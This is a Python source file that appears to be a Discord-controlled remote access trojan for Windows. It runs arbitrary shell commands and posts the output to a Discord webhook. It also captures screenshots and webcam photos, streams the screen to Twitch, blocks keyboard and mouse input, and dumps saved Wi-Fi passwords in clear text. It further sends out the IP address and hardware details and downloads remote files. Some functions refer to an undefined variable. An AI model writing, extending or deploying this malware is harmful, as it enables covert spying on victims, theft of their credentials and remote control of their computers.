import re
import os
import time
import subprocess
import pyautogui
import datetime
import discord
from discord_webhook import DiscordWebhook
import wmi
import requests
import cv2
import pynput
import webbrowser
import sounddevice as sd
from scipy.io.wavfile import write
from discord.ext import commands
from pynput.keyboard import Controller, Key
import asyncio
import mss
import numpy as np
import threading
import pyperclip



TOKEN = ""
WEBHOOK_URL = ""
USER_ID1 = ''
USER_ID2 = ''


intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')



keyboard = Controller()
MODIFIERS = {
    "ctrl": Key.ctrl_l,  # Left Control
    "shift": Key.shift,  # Shift
    "alt": Key.alt_l,     # Left Alt
    "win": Key.cmd,      # Windows key (Command key on Mac)
    "esc": Key.esc,      # Escape key
    "space": Key.space,  # Space key
    "enter": Key.enter,  # Enter key
    "tab": Key.tab,      # Tab key
    "backspace": Key.backspace,  # Backspace key
    "delete": Key.delete,  # Delete key
    "up": Key.up,        # Up arrow key
    "down": Key.down,    # Down arrow key
    "left": Key.left,    # Left arrow key
    "right": Key.right,  # Right arrow key
    "f1": Key.f1,        # F1 key
    "f2": Key.f2,        # F2 key
    "f3": Key.f3,        # F3 key
    "f4": Key.f4,        # F4 key
    "f5": Key.f5,        # F5 key
    "f6": Key.f6,        # F6 key
    "f7": Key.f7,        # F7 key
    "f8": Key.f8,        # F8 key
    "f9": Key.f9,        # F9 key
    "f10": Key.f10,      # F10 key
    "f11": Key.f11,      # F11 key
    "f12": Key.f12,      # F12 key 
}


#################################################################################
#                                   FUNCTIONS                                   #
#################################################################################

def send_webhook(content):
    webhook = DiscordWebhook(url=WEBHOOK_URL, content=content)
    response = webhook.execute()


def get_clipboard():
    return pyperclip.waitForPaste()



def set_clipboard(text):
    pyperclip.copy(text)



def command(command):
    #message.channel.send('Sent command!')
    command = command.replace('command ', '')
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    out = output.stdout
    out = out.replace('Ã', '├')
    out = out.replace('Ä', '─')
    print(out)
    chunklength = 2000
    chunks = [out[i:i+chunklength ] for i in range(0, len(out), chunklength )]

    for chunk in chunks: 
        send_webhook(chunk)
        



def get_screenshot():
    time_now = datetime.datetime.now()
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save("screenshot.png")
    webhook = DiscordWebhook(url=WEBHOOK_URL, content="Screenshot taken at " + str(time_now))
    with open("./screenshot.png", "rb") as f:
        webhook.add_file(file=f.read(), filename="screenshot.png")
    response = webhook.execute()
    os.remove("./screenshot.png")



def camera():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not open camera.")
        return
    capture_duration = 1
    start_time = time.time()
    while (time.time() - start_time) < capture_duration:
        ret, frame = cap.read()
        if not ret:
            print("Error: Failed to capture frame.")
            break
    cv2.imwrite("pic.jpg", frame)
    print("Picture captured successfully as 'captured_picture.jpg'")
    cap.release()
    cv2.destroyAllWindows()
    time_now = datetime.datetime.now()

    webhook = DiscordWebhook(url=WEBHOOK_URL, content="pic taken at " + str(time_now))
    with open("./pic.jpg", "rb") as f:
        webhook.add_file(file=f.read(), filename="pic.jpg")
    response = webhook.execute()
    os.remove("./pic.jpg")
    
    
    
def com(command):
    message.channel.send('Sent command!')
    command = command.replace('com ', '')
    os.system(command)


def send_to_lock_screen():
    os.system("rundll32.exe user32.dll,LockWorkStation")
    send_webhook("Locked the computer")


def lock(command):
    command = message.content
    command = command.replace('lock ', '')
    message.channel.send(f'locked system interactions for {command} seconds...')
    mouse_listener = pynput.mouse.Listener(suppress=True)
    mouse_listener.start()
    keyboard_listener = pynput.keyboard.Listener(suppress=True)
    keyboard_listener.start()
    time.sleep(int(command))
    mouse_listener.stop()
    keyboard_listener.stop()
    message.channel.send('unlocked!')

def stream_twitch(stream_key):
    command = stream_key
    command = command.replace('stream ', '')
    command = command.split()
    key = command[0]
    message.channel.send(f'Streaming...')
   
    
    TWITCH_URL = "rtmp://live.twitch.tv/app/"
    STREAM_KEY = key  # Replace with your Twitch Stream Key

    # FFmpeg command to stream
    ffmpeg_cmd = [
        "ffmpeg",
        "-y",  # Overwrite output files
        "-f", "rawvideo",  # Input format
        "-vcodec", "rawvideo",
        "-pix_fmt", "bgr24",  # Pixel format
        "-s", "1280x720",  # Frame size
        "-r", "30",  # Frame rate
        "-i", "-",  # Input comes from stdin
        "-c:v", "libx264",  # Encode in H.264
        "-pix_fmt", "yuv420p",  # Pixel format for output
        "-preset", "veryfast",  # Encoding speed/quality trade-off
        "-f", "flv",  # Output format
        TWITCH_URL + STREAM_KEY
    ]

    # Start FFmpeg process
    process = subprocess.Popen(ffmpeg_cmd, stdin=subprocess.PIPE)

    # Initialize screen capture using mss
    with mss.mss() as sct:
        # Define the monitor to capture (primary monitor)
        monitor = sct.monitors[1]  # You can change this to sct.monitors[x] if needed

        try:
            while True:
                # Capture the screen
                screenshot = sct.grab(monitor)

                # Convert the raw screenshot to a NumPy array
                frame = np.array(screenshot)

                # Convert BGRA to BGR (drop alpha channel)
                frame = frame[:, :, :3]

                # Resize to 1920x1080
                frame = cv2.resize(frame, (1280, 720))

                # Write frame to FFmpeg process
                process.stdin.write(frame.tobytes())

        except KeyboardInterrupt:
            print("Streaming stopped by user.")

        finally:
            # Cleanup
            process.stdin.close()
            process.wait()


def wifi():
    networks, out = [], ''
    wifis = []

    try:
        wifi = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'], shell=True,
            stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
        wifi = [i.split(":")[1][1:-1]
                for i in wifi if "All User Profile" in i]
        wifis = len(networks)

        for name in wifi:
            try:
                results = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                    stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                results = [b.split(":")[1][1:-1]
                            for b in results if "Key Content" in b]
                
            except subprocess.CalledProcessError:
                networks.append((name, ''))
                continue

            try:
                networks.append((name, results[0]))
            except IndexError:
                networks.append((name, ''))

    except subprocess.CalledProcessError:
        pass
    except UnicodeDecodeError:
        pass

    out += f'{"SSID":<20}| {"PASSWORD":<}\n'
    out += f'{"-"*20}|{"-"*29}\n'
    for name, password in networks:
        out += '{:<20}| {:<}\n'.format(name, password)
    send_webhook("`"+ out + "`")


def get_ip():
    ip = requests.get('https://api.ipify.org?format=json').text
    send_webhook(f'IP(v4): {ip}')
    ip = requests.get('https://api64.ipify.org?format=json').text
    send_webhook(f'IP(v6): {ip}')
    
    
def download(url, filename):
    r = requests.get(url, allow_redirects=True)
    open(filename, 'wb').write(r.content)
    send_webhook(f'Downloaded file: {filename}')


def sys():
    cpu = wmi.WMI().Win32_Processor()[0].Name
    gpu = wmi.WMI().Win32_VideoController()[0].Name
    ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                0].TotalVisibleMemorySize) / 1048576, 0)
    send_webhook("`" + "CPU: " + str(cpu) + "\nGPU: " + str(gpu) + "\nRAM: " + str(ram) + "GB" + "`")
    


def play_audio(url, time):
    r = requests.get(url, allow_redirects=True)
    open('sound.m4a', 'wb').write(r.content)
    os.system("sound.m4a")

    time.sleep(int(time))

    os.remove("sound.m4a")
    os.system("TASKKILL /F /IM Microsoft.Media.Player.exe")
